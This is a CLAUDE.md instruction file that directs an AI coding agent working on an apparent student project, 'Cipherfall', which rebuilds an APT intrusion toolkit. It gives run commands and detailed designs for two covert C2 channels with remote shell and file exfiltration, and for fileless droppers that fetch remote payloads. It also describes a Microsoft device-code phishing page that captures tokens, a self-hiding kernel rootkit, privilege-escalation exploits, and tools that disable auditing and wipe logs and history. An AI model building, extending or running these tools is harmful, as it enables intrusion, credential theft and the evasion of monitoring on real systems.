# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project context

Cipherfall is an ESGI annual project simulating the reconstruction of an APT's tooling arsenal. The modules cover the full attack lifecycle: reconnaissance, obfuscation, C2, dropping payloads, phishing, privilege escalation, rootkits, and anti-forensics. All code is for authorized security research and educational purposes.

## Module execution

```bash
# Phantom Eye — single semicolon-delimited output line
bash Modules/Recon/phantom_eye.sh

# ShadowScript: obfuscate a bash script (advanced: ROT13+chunks+random vars+decoys)
bash Modules/Obfuscator/shadowscript.sh <script.sh>

# ShadowScript: obfuscate a Python script (same technique but for .py)
python3 Modules/Obfuscator/shadowscript.py <script.py>

# EchoErase: ghost shell (root recommended for full coverage)
sudo bash Modules/Anti-forensics/echoerase_ghost.sh

# EchoErase: inject randomized sleep delays between lines of a script
bash Modules/Anti-forensics/echoerase_delayer.sh <script.sh> <fixed_delay_s> <jitter_s>

# EchoErase: rename a file (base64 stem by default, or random/ext options)
python3 Modules/Anti-forensics/echoerase_renamer.py [--no-recover] [--ext] [--view] <file>

# NullRelay: start Cloudflare C2 server (copy Modules/C2/.env.example → .env and fill values)
cd Modules/C2/cloudflare-worker && pip install -r requirements.txt
python3 server.py

# C2: interactive TUI dashboard (NullRelay / ClockVenom) — reads Modules/C2/.env automatically
python3 Modules/C2/tui.py

# NullRelay: deploy Cloudflare Worker dead-drop (D1 database required)
cd Modules/C2/cloudflare-worker
wrangler d1 create cipherfall-c2-db          # copy returned id into wrangler.toml [[d1_databases]]
wrangler d1 execute cipherfall-c2-db --remote --command "CREATE TABLE IF NOT EXISTS tasks (agent_id TEXT PRIMARY KEY, value TEXT NOT NULL, expires_at INTEGER NOT NULL); CREATE TABLE IF NOT EXISTS results (task_id TEXT PRIMARY KEY, value TEXT NOT NULL, expires_at INTEGER NOT NULL); CREATE TABLE IF NOT EXISTS heartbeats (agent_id TEXT PRIMARY KEY, value TEXT NOT NULL, expires_at INTEGER NOT NULL);"
wrangler secret put WORKER_SECRET            # value = HMAC-SHA256(PSK, "worker_token")[:32]
wrangler deploy

# ClockVenom: start NTP C2 server (requires root or CAP_NET_BIND_SERVICE for UDP/123)
cd Modules/C2/ntp && pip install -r requirements.txt
sudo python3 server.py

# ClockVenom: print agent ID on target (no pip required)
python3 Modules/C2/ntp/clockvenom.py --id

# ShadowDrop: fileless binary execution via memfd_create
python3 Modules/Dropper/shadowdrop_bin.py

# ShadowDrop: fileless bash script execution via memfd_create
python3 Modules/Dropper/shadowdrop_sh.py

# ShadowDrop: fileless Python script execution via memfd_create + exec
python3 Modules/Dropper/shadowdrop_py.py

# PhantomPage: Microsoft device flow 2FA bypass (serves phishing page)
cd Modules/Phishing/deviceflowbypass2fa && pip install -r req.txt && python3 phantompage.py

# IronVeil: build and load LKM rootkit (requires linux-headers for current kernel)
apt install linux-headers-$(uname -r)   # Debian/Ubuntu
# pacman -S linux-headers               # Arch
cd Modules/Rootkits && make && sudo insmod ironveil.ko
# Note: build fails if the module path contains spaces — build from a symlinked path without spaces

# IronVeil: cross-compile .ko for a remote target from Phantom Eye recon output (requires Docker)
python3 Modules/Rootkits/ironveil_compiler.py "Ubuntu;22.04;5.15.0-127-generic;..."
# Or explicit args:
python3 Modules/Rootkits/ironveil_compiler.py --distro Debian --version 12 --kernel 6.1.0-49-amd64
python3 Modules/Rootkits/ironveil_compiler.py --distro Arch   --kernel 7.0.11-arch1-1 --output /tmp/
# Supported distro families: Debian/Ubuntu/Kali, Arch/Manjaro, Fedora/RHEL/AlmaLinux/Rocky. DSM raises error with toolkit instructions.

# IronVeil dead-drop: embed payload URL into stego PNG (run once, then host the PNG)
python3 Modules/Stégano/stego_embed.py <input_favicon.png> <payload_url> <output.png>
# Verify extraction:
python3 Modules/Stégano/stego_embed.py --view <output.png>

# Privesc: DirtyFrag exploit (CVE)
cd Modules/Privesc/dirtyfrag && ./exp

# Privesc: ssh-keysign privilege escalation
cd Modules/Privesc/ssh-keysign-pwn && make && ./sshkeysign_pwn

# Privesc: Fragnesia namespace wrapper (CVE-2026-46300)
bash Modules/Privesc/fragnesia.sh

# Privesc: CopyFail splice-based privilege escalation (requires Python ≥ 3.10)
python3 Modules/Privesc/copyfail.py
```

## Architecture

Full attack pipeline: recon target → obfuscate payload → drop via fileless dropper → beacon to C2 via Cloudflare dead-drop → escalate privileges → persist with rootkit → cover tracks with anti-forensics.

**Phantom Eye** (`phantom_eye.sh`): Collects system fingerprint data using only built-in tools and standard binaries (`testparm`, `aws`, `psql`, `mongosh`, `gitlab-rake`, etc.). Falls back gracefully to `N/A` for each unavailable data source. Output is always exactly one line: `Distro;Version;Kernel;SMB_Shares;NFS_Exports;S3_Buckets;MariaDB_DBs;PostgreSQL_DBs;MongoDB_DBs;GitLab_Version`. DSM-specific fallbacks: Distro/Version from `/etc.defaults/VERSION` (`os_name`/`productversion` fields); SMB shares via `/usr/local/packages/@appstore/SMBService/usr/bin/testparm` (standard `testparm` absent from PATH on DSM); MariaDB via `/usr/local/mariadb10/bin/mysql` or `/var/packages/MariaDB10/target/usr/local/mariadb10/bin/mysql`; `showmount` wrapped in `timeout 5` to prevent blocking.

**ShadowScript** (`shadowscript.sh`, `shadowscript.py`): Stacks gzip → base64 → ROT13, then splits into variable-size chunks, shuffles chunk definition order (Fisher-Yates), encodes all command names in hex (`$'\x..'`) or chr() sequences, and injects decoy variables from a hardcoded fake-pool. The final stub never contains any readable string like `eval`, `base64`, or `gunzip`.

**NullRelay / ClockVenom** (`server.py`, `nullrelay.py` / `clockvenom.py`, `worker.js`, `tui.py`, `operator_cli.py`): Three-tier architecture — C2 server (operator-side, no public port) ↔ Cloudflare Worker D1 dead-drop ↔ agent (victim-side). Server and agent never connect directly; all traffic is HTTPS/443 to Cloudflare edge.

_Dead-drop flow:_ (1) operator queues task → stored in SQLite as `pending`; (2) server dispatch loop PUTs encrypted task to Worker `PUT /task/{agent_id}` → marked `sent` on HTTP 200; (3) agent beacons: PUTs heartbeat to `/hb/{agent_id}`, GETs `/task/{agent_id}` (204 = nothing, 200 = execute), PUTs result to `/result/{task_id}`; (4) server collect loop GETs `/result/{task_id}` → decrypts, stores in SQLite, marks `done`.

_Encryption:_ AES-256-GCM. Key = PBKDF2-SHA256(PSK, `cipherfall_c2_v1`, 32 bytes, 100k iterations). Wire = `base64(nonce[12] ‖ ciphertext ‖ GCM-tag[16])`. Server uses pycryptodome; agent implements AES-256-GCM from scratch in pure Python stdlib (no pip on target).

_Authentication:_ `Authorization: Bearer <token>` where token = `HMAC-SHA256(PSK, b"worker_token").hexdigest()[:32]`, derived identically on server and agent. Worker returns 404 on bad token to avoid fingerprinting.

_Agent identity:_ SHA-256 of `/etc/machine-id` (fallback: hostname), truncated to 32 hex chars. Deterministic across reboots. Print with `python3 nullrelay.py --id` (or `clockvenom.py --id` for NTP agent). Agent spoofs `User-Agent: Mozilla/5.0 … Chrome/124`.

_Agent commands:_ any shell string (executed via `/bin/sh`, stdout+stderr returned); `UPLOAD:/path` (file read binary, returned as base64).

_Worker D1 storage:_ Three tables (`tasks`, `results`, `heartbeats`), each with an `expires_at` column (Unix timestamp). TTLs enforced on every read: task 1h, result 24h, heartbeat 10min. Task GET is one-time read (`ctx.waitUntil` delete). `GET /agents` queries `heartbeats WHERE expires_at > now`. Worker also supports `DELETE /{resource}/{id}` to purge any row immediately (used by server when deleting an agent). D1 provides strong read-after-write consistency (primary replica) vs. KV eventual consistency — task delivery latency ~1s vs. up to 60s with KV.

_Server env vars:_ `WORKER_URL` (required), `C2_PSK` (default: `changeme`), `C2_DB` (`c2.db`), `C2_ADMIN` (port, default `1337`), `C2_POLL` (interval s, default `10`).

_Agent env vars (bake before obfuscating):_ `WORKER_URL` (required), `C2_PSK` (`changeme`), `C2_INT` (beacon interval s, `30`), `C2_JITTER` (±jitter s, `10`).

_Server admin API (127.0.0.1 only):_ `GET /admin/agents`, `GET /admin/tasks`, `POST /admin/register {agent_id, label?}`, `POST /admin/task {agent_id, command}`, `GET /admin/result/<task_id>`, `DELETE /admin/agents/{agent_id}` (removes agent + its tasks from SQLite and purges heartbeat from CF Worker D1 so the heartbeat loop does not re-register it). Identical API on both NullRelay (`:1337`) and ClockVenom (`:1338`) servers.

_TUI_ (`tui.py`, Textual + Rich): three tabs — **Agents** (list agents, browse tasks, dispatch commands, auto-refresh every 5s; `d` deletes selected agent with confirmation modal — sends `kill $PPID` if alive, then removes from DB and purges CF Worker heartbeat), **Graphe** (ASCII topology tree showing C2 → direct agents → relay chains, dead agents in separate section), **Payload** (bakes `nullrelay.py` or `clockvenom.py` via regex substitution of constants, optionally calls `shadowscript.py`). Loads `.env` from the script's own directory (`pathlib.Path(__file__).parent / ".env"`). Reads `C2_ADMIN_PORTS` (comma-separated list, default `1338,1337` — polls all ports and merges results), `WORKER_URL`, `C2_PSK`, `C2_HOST`.

_TUI special commands (cmd-input, agent must be selected):_
- `/module relay [start [port]]` — start a TCP relay on the agent. NullRelay agents: opens a reverse TCP tunnel on the specified port (default 443) back to the CF Worker. ClockVenom/NTP agents: opens a local TCP listener on the specified port (default 123) that forwards to `C2_HOST:443`; bypasses UDP/123 packet-size limit for subsequent commands.
- `/module upload <local_path> [remote_path]` — read `local_path` on the operator machine, base64-encode, send as shell command `echo '<b64>' | base64 -d > <remote_path>` to the agent. Default remote path: `/tmp/<filename>`. Size limit: practical limit ~few MB (CF Workers 100 MB request cap); prefer relay for large binaries.
- `/module download <remote_path> [local_path]` — download a file from the agent. Default local path: `downloads/<filename>` relative to `tui.py`. Behavior differs by agent type:
  - **CF (NullRelay) agent**: sends `UPLOAD:<remote_path>` (raw binary → base64, no size limit beyond CF 100 MB cap). Single task, result decoded and written on receipt.
  - **NTP (ClockVenom) agent**: gzip-compresses the file on the agent (`gzip.compress(data, 9, mtime=0)`, deterministic), then chunks the base64 output into 550-char pieces. Sends one task per chunk; chunks collected every 5 s by background loop, reassembled and decompressed when all received. Throughput: ~110 bytes/s for text, ~18 bytes/s for binaries. For files > ~50 KB, run `/module relay` first so subsequent `UPLOAD:` commands bypass the UDP packet-size limit entirely.
- `/module recon [--obfuscate] [--delayer INT JITTER] [--renamer]` — run `phantom_eye.sh` on the agent. All stages opt-in: `--obfuscate` applies shadowscript; `--delayer INT JITTER` injects random sleep delays (e.g. `--delayer 0.5 0.2`); `--renamer` renames with `echoerase_renamer.py --no-recover --ext` (random 6-char stem + plausible ext). Stages apply in order: delayer → obfuscate → renamer. Final script base64-encoded and sent inline (`base64 -d > /tmp/.<hex8> && bash ... ; rm`). Output: single semicolon-delimited phantom_eye line. Execution ~10–30 s (phantom_eye probes many services with fallbacks).
- `/module ghost on|off|status` — toggle ghost mode on the agent. When on, every subsequent shell command is wrapped with the echoerase_ghost preamble before execution: kernel audit blackout (`auditctl -e 0`), auditbeat stop, history env vars zeroed (`HISTFILE=/dev/null`, `HISTSIZE=0`), SSH/sudo/terminal fingerprint env vars unset, snoopy LD_PRELOAD neutralized, core dumps disabled (`ulimit -c 0`). Audit and auditbeat are restored after each command. Persists until `/module ghost off` or agent restart. UPLOAD:/WRITE: commands are not wrapped (file ops, not shell). Root recommended for full coverage (auditctl requires CAP_AUDIT_CONTROL).
- `/module suicide` — self-destruct the agent. Sends `[suicide: ok]` result; cleanup fires only after the result is confirmed delivered to the C2 server (event-based via `threading.Event`, max 30 s NullRelay / 60 s ClockVenom): disables kernel audit; shreds/removes the agent `.py` file and its `.pyc`/`__pycache__`; shreds shell history files (`~/.bash_history`, `~/.zsh_history`, `~/.sh_history`, `~/.history`); removes hidden `/tmp/.*` files owned by the agent user (leftover recon scripts); kills the agent process. NullRelay: event set after `PUT /result` returns 200. ClockVenom: event set when the server ACKs the beacon carrying the result. TUI confirms, then auto-removes the agent from the DB (equivalent to `d` delete). Root recommended for `shred` and `auditctl`.

_Operator CLI_ (`operator_cli.py`, stdlib only): `agents`, `register <id> [label]`, `tasks`, `task <id_prefix> <cmd>` (prefix min 4 chars), `result <task_id>`, `wait <task_id>` (polls every 5s).

_Worker deployment:_ see run commands above for full D1 setup sequence. `WORKER_SECRET` = `HMAC-SHA256(PSK, b"worker_token").hexdigest()[:32]`.

_Limitations:_ task lost if agent crashes after GET before PUT result (re-queue manually); one pending task per agent at a time; SQLite not suitable for large deployments; agent has no persistence (pair with dropper).

**ShadowDrop** (`shadowdrop_bin.py`, `shadowdrop_sh.py`, `shadowdrop_py.py`): Fileless execution via `memfd_create(2)` — payload downloaded over HTTP(S) never touches disk. Binary dropper: `MFD_CLOEXEC` set, kernel execs the fd directly. Shell dropper: no `MFD_CLOEXEC` (fd must stay open for bash), exec via `/proc/self/fd/<n>`. Python dropper: similar to shell but invokes `python3`. All three support `DAEMON_MODE` for double-fork daemonization.

**Phishing** (`deviceflowbypass2fa/`): Microsoft OAuth 2.0 device authorization flow abuse. Flask server proxies requests to `login.microsoftonline.com/common/oauth2/v2.0/devicecode`, displays the user code via `outlook.html` phishing page, then polls for token completion to capture access + refresh tokens. Scope includes `offline_access` to obtain long-lived refresh tokens.

**IronVeil** (`ironveil.c`, `stego_embed.py`): Linux LKM rootkit. Hooks `__x64_sys_read`, `__x64_sys_getdents64`, `__x64_sys_kill` via **kretprobes** (requires `CONFIG_KPROBES`). At load: (1) injects NTP-to-C2 redirect IPs into `/etc/hosts` for ClockVenom redirection; (2) hooks `read()` to filter those IPs from every process except ones named `ntp-agent` (ClockVenom agent sets this name via `prctl(PR_SET_NAME)` before DNS resolution); (3) self-hides from `lsmod`, `/proc/modules`, `/sys/module/`. Runtime file/PID hiding via `/proc/ironveil_ctrl` (write-only, itself hidden); max 64 PIDs, 64 filenames. Files prefixed `ironveil_` auto-hidden. `rmmod` unavailable after self-hide; hooks survive until reboot. **Dead-drop resolver**: at load, schedules a delayed kernel workqueue (5s) that calls `call_usermodehelper` to spawn `python3` with an embedded fetcher script. The script: renames itself `kworker/0:1H` via `prctl`; sleeps 60–300s (random); fetches a PNG from `STEGO_IMG_URL`; walks PNG chunks to find `tEXt` keyword `X-Payload`; base64-decodes and XOR-decrypts (16-byte key, same as `stego_embed.py`) to recover the payload URL; double-forks and execs the payload fileless via `memfd_create`. Operator workflow: run `stego_embed.py` to embed URL into a PNG, host it publicly, set `STEGO_IMG_URL` + `PYTHON3_PATH` in `ironveil.c`, rebuild. Build prereq: `linux-headers-$(uname -r)`. Kernel compat: ≥ 6.1 with BHI mitigations (kretprobe on `x64_sys_call`), 5.7–6.x (kallsyms via kprobe), 4.x–5.6 (kallsyms exported directly). Tested on Debian 12, kernel 6.1.0-49-amd64. Bypasses: `mmap()` and `pread64()` on `/etc/hosts` not hooked — true content readable. File hiding blocks `getdents` only; direct path access (`cat /path/file`) unaffected.

**ClockVenom** (`ntp/clockvenom.py`, `ntp/server.py`): NTP-tunnelled C2. Agent resolves its distro's default NTP domain (e.g. `ntp.ubuntu.com`) — operator compromises `/etc/hosts` on target to redirect that domain to the C2 server. Alternatively set `C2_DIRECT=<ip>` to bypass DNS entirely and connect directly to a known IP (no `/etc/hosts` modification needed). Commands and results are hidden in NTS Cookie extension fields (type `0x0104`, RFC 8915) of standard NTP Mode-3/4 packets; clean 48-byte requests sent when idle. Encryption same AES-256-GCM + PBKDF2-SHA256 scheme as NullRelay. Server binds UDP/123 (requires root) + FastAPI admin HTTP on `127.0.0.1:1338`; `operator_cli.py` and `tui.py` work against it unchanged. Same admin API as NullRelay including `DELETE /admin/agents/{agent_id}`. Env vars: `C2_PSK`, `C2_DB` (`ntp_c2.db`), `C2_ADMIN` (`1338`), `C2_DEBUG`. Agent additional env vars: `C2_DIRECT` (IP, bypasses DNS), `C2_TCP_PORT` (TCP relay port, default `443`).

**Privesc** (`dirtyfrag/`, `ssh-keysign-pwn/`, `fragnesia.sh`, `copyfail.py`): Four exploits. `dirtyfrag` targets CVE via fragmented memory. `ssh-keysign-pwn` abuses `ssh-keysign` SUID binary (also includes `chage_pwn.c` and `exploit_vuln_target.c`). `fragnesia.sh` sets up a user+network namespace (CVE-2026-46300 prerequisite) via `unshare --user --map-root-user --net` and drops into an interactive shell ready to run the actual exploit — it is the namespace wrapper, not the exploit binary itself. `copyfail.py` implements splice-based arbitrary-write via AF_ALG + KTLS socket (ctypes `libc.splice()`), overwrites `/bin/su` in-place kernel-copy-style, then calls `os.system("su")`; requires Python ≥ 3.10.

**EchoErase — ghost-shell** (`echoerase_ghost.sh`): Five phases: (1) disable kernel auditing (`auditctl -e 0`) + stop auditbeat; (2) erase utmp/wtmp entries for current TTY via `utmpdump -r`; (3) zero lastlog for current UID via `dd` (seek to `uid * 292`); (4) scrub environment variables (SSH_*, SUDO_*, terminal fingerprints); (5) exec shell spoofed as `[kworker/u:0]` via `exec -a`. `trap EXIT` restores audit rules. Limitation: `/proc/<PID>/exe` still points to real bash.

**EchoErase — delayer** (`echoerase_delayer.sh`): Injects `sleep <N>` after each substantive line, skipping comments, blank lines, backslash/pipe continuations, and shell control keywords. Delay randomized via awk with nanosecond seed.

**EchoErase — renamer** (`echoerase_renamer.py`): Renames files using base64 URL-safe stem encoding (RFC 4648 §5, no padding, reversible via `--view`). `--no-recover`: random 6-char alphanumeric stem (CSPRNG, irreversible). `--ext`: replaces extension with a plausible alternative from a family table. All modes combinable except `--view` + `--ext`.

## Test environments

**Synology DSM VM** (`192.168.5.44`): DSM 7.2.2-72806, kernel 4.4.302+. Used to validate Phantom Eye DSM fallbacks and enumerate LOLBins. Credentials stored separately, not in this file.

_Key DSM paths:_
- Version info: `/etc.defaults/VERSION`
- SMB config: `/etc/samba/smb.conf` (shares not visible via grep — use testparm below)
- SMB testparm: `/usr/local/packages/@appstore/SMBService/usr/bin/testparm`
- smbd binary: `/usr/local/packages/@appstore/SMBService/usr/sbin/smbd`
- MariaDB (if installed via Package Center): `/usr/local/mariadb10/bin/mysql` or `/var/packages/MariaDB10/target/usr/local/mariadb10/bin/mysql`
- Syno backup tool: `/usr/syno/bin/synobackup`
- Shared folder sync: `/usr/syno/bin/s2s_syncer <task_id>`
- Syno copy utility: `/usr/syno/bin/synocopy`

_LOLBins confirmed present on DSM 7.2.2 (usable for exfil without pip):_
`curl`, `wget`, `python3` (3.8.15), `python` (2.x), `php`, `openssl` (1.1.1u), `ssh`, `scp`, `sftp`, `rsync`, `base64`, `xxd`, `od`, `gzip`, `bzip2`, `tar`, `dd`, `cat`, `tee`, `awk`, `sed`

_Backup LOLBins (trafic légitime):_ `synobackup` (Hyper Backup, nécessite tâche préconfigurée), `s2s_syncer` (Shared Folder Sync, nécessite tâche préconfigurée), `rsync`/`scp` (standards, aucune config).

## Coding conventions

- Each file starts with a detailed header block explaining what the module does, all techniques used, and known limitations (see existing files as reference).
- No inline or explanatory comments anywhere else in the code — only the header.
- When adding a new module, test it before reporting it complete; if a live test is not possible, explicitly say so.
- Variable names in obfuscated stubs are always randomly generated at obfuscation time, not hardcoded.
